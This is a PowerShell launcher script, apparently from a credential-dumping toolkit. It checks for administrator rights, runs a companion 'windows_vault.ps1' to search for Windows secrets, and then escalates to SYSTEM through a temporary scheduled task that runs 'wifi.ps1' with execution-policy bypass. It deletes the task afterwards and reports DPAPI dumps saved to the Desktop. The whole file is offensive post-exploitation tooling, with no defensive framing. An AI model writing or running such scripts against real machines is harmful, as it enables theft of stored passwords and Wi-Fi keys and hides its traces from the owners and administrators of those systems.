$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())

Write-Host "[*] Checking admin rights" -ForegroundColor Yellow

if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] Please relaunch this script as Administrator." -ForegroundColor Red
    exit
}

Write-Host "[+] User is admin" -ForegroundColor Green
Write-Host "[*] Searching for Windows Secrets" -ForegroundColor Yellow

& ".\windows_vault.ps1"

$scriptPath = Join-Path $PSScriptRoot "wifi.ps1"
$time = (Get-Date).AddMinutes(10).ToString("HH:mm")

Write-Host "[*] Launching wifi script with SYSTEM rights" -ForegroundColor Yellow

schtasks /Create /TN "TempWiFiTask" /TR "powershell -ExecutionPolicy Bypass -File `"$scriptPath`"" /SC ONCE /ST $time /RU SYSTEM /F *> $null 2>&1
schtasks /Run /TN "TempWiFiTask" *> $null 2>&1
schtasks /Delete /TN "TempWiFiTask" /F *> $null 2>&1

Write-Host "[+] Done. Files saved to 'DPAPI_dumps' in Desktop folder" -ForegroundColor Green